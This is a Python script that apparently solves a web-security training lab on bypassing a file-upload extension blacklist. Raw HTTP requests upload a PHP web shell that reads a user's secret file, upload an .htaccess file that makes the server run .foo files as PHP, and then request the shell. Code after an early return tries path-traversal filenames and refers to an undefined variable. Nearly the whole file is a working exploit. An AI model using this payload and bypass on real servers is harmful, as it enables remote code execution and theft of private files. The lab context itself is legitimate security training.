# File upload vulnerabilities 20 of 35
# Lab: Web shell upload via extension blacklist bypass

import asyncio
from pprint import pprint
from common.base import run_payloads

RAW_REQUEST_POST_1 = """
POST /my-account/avatar HTTP/2
Host: 0aef00270457e0178144204e00af003f.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: multipart/form-data; boundary=----geckoformboundary71afc5939b06ea691dcceba62e6db6d3
Content-Length: 529
Origin: https://0aef00270457e0178144204e00af003f.web-security-academy.net
Connection: keep-alive
Referer: https://0aef00270457e0178144204e00af003f.web-security-academy.net/my-account?id=wiener
Cookie: session=qKqg7vmpqln3R5zZhpMjvyeeXJF6Sidd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache

------geckoformboundary71afc5939b06ea691dcceba62e6db6d3
Content-Disposition: form-data; name="avatar"; filename="@@@PAYLOAD@@@"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------geckoformboundary71afc5939b06ea691dcceba62e6db6d3
Content-Disposition: form-data; name="user"

wiener
------geckoformboundary71afc5939b06ea691dcceba62e6db6d3
Content-Disposition: form-data; name="csrf"

FlBs14amOhrNBQjQ7QXbKMbk81r7V2ja
------geckoformboundary71afc5939b06ea691dcceba62e6db6d3--

""".strip()

RAW_REQUEST_POST_2 = """
POST /my-account/avatar HTTP/2
Host: 0aef00270457e0178144204e00af003f.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: multipart/form-data; boundary=----geckoformboundary71afc5939b06ea691dcceba62e6db6d3
Content-Length: 529
Origin: https://0aef00270457e0178144204e00af003f.web-security-academy.net
Connection: keep-alive
Referer: https://0aef00270457e0178144204e00af003f.web-security-academy.net/my-account?id=wiener
Cookie: session=qKqg7vmpqln3R5zZhpMjvyeeXJF6Sidd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache

------geckoformboundary71afc5939b06ea691dcceba62e6db6d3
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .foo
------geckoformboundary71afc5939b06ea691dcceba62e6db6d3
Content-Disposition: form-data; name="user"

wiener
------geckoformboundary71afc5939b06ea691dcceba62e6db6d3
Content-Disposition: form-data; name="csrf"

FlBs14amOhrNBQjQ7QXbKMbk81r7V2ja
------geckoformboundary71afc5939b06ea691dcceba62e6db6d3--

""".strip()

RAW_REQUEST_GET = """
GET @@@PAYLOAD@@@ HTTP/2
Host: 0aef00270457e0178144204e00af003f.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: https://0aef00270457e0178144204e00af003f.web-security-academy.net/my-account
Cookie: session=qKqg7vmpqln3R5zZhpMjvyeeXJF6Sidd
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Pragma: no-cache
Cache-Control: no-cache
TE: trailers
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True)
    return result

async def print_net_result(raw_req, print_response_body=False):
    result = await one_call(raw_req)
    if result['status_code'] == 200:
        secs = result['total_seconds']
        print(f" CALL OK, {secs:.2f} secs")
        if print_response_body: pprint(result['full_text'])
        return True, result['full_text']
    else:
        print(" CALL FAILED")
        if print_response_body: pprint(result['full_text'])
        return False, result['full_text']

def xmlencode (text: str) -> str:
    return "".join(f"&#x{ord(c):X};" for c in text)

async def main():

    # Original post (it fails due to blacklisted extension)
    raw_req_0 = RAW_REQUEST_POST_1.replace("@@@PAYLOAD@@@", "exploit.php")
    print('PHP POST:', end='')
    await print_net_result(raw_req_0, True)

    raw_req_1 = RAW_REQUEST_POST_1.replace("@@@PAYLOAD@@@", "exploit.foo")
    print('PHP POST:', end='')
    await print_net_result(raw_req_1, True)

    raw_req_2 = RAW_REQUEST_POST_2 # .replace("@@@PAYLOAD@@@", "")
    print('PHP POST:', end='')
    await print_net_result(raw_req_2, True)

    # Final attack
    raw_req_3 = RAW_REQUEST_GET.replace("@@@PAYLOAD@@@", "/files/avatars/exploit.foo")
    print('Final attack:', end='')
    await print_net_result(raw_req_3, True)

    return

    raw_req_7 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", "../exploit.php")
    print('path-traversal POST:', end='')
    await print_net_result(raw_req_7, True)

    raw_req_9 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", "..%2fexploit.php")
    print('path-traversal POST with encoding:', end='')
    await print_net_result(raw_req_9, True)

    raw_req_12 = RAW_REQUEST_GET.replace("@@@PAYLOAD@@@", "/files/avatars/../exploit.php")
    print('path-traversal GET with encoding:', end='')
    await print_net_result(raw_req_12, True)

if __name__ == "__main__":
    asyncio.run(main())